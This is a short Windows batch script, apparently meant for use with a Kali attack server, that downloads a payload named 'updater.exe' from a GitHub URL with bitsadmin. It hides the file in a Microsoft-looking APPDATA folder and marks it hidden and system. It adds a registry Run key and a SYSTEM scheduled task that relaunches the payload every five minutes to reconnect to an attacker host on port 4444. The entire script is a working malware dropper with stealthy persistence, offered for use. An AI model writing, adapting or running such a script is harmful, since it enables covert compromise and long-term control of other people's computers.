# Windows Script: Payload and Persistence
# This batch script will:
# 1. Download the payload from your Kali server.
# 2. Copy it to a hidden system folder.
# 3. Set up persistence using registry and Task Scheduler.

@echo off
setlocal enableDelayedExpansion

REM Change these to your server's IP and file location
set LHOST=10.221.71.84
set LPORT=4444
set FILENAME=updater.exe
set FILEURL=https://github.com/H4ck3r-netizen/BD/raw/refs/heads/main/updater.exe
set INSTALLDIR=%APPDATA%\Microsoft\Windows\Updater

REM Create installation directory
mkdir "%INSTALLDIR%"

REM Download the payload
bitsadmin /transfer myDownloadJob /download /priority high %FILEURL% "%INSTALLDIR%\%FILENAME%"

REM Make it hidden and system
attrib +s +h "%INSTALLDIR%\%FILENAME%"

REM Add to startup (Registry Persistence)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "%INSTALLDIR%\%FILENAME%" /f

REM Set up Task Scheduler to reconnect every 5 minutes
schtasks /create /tn "Updater" /tr "%INSTALLDIR%\%FILENAME%" /sc minute /mo 5 /ru System

REM Start the payload
start "%INSTALLDIR%\%FILENAME%"

endlocal
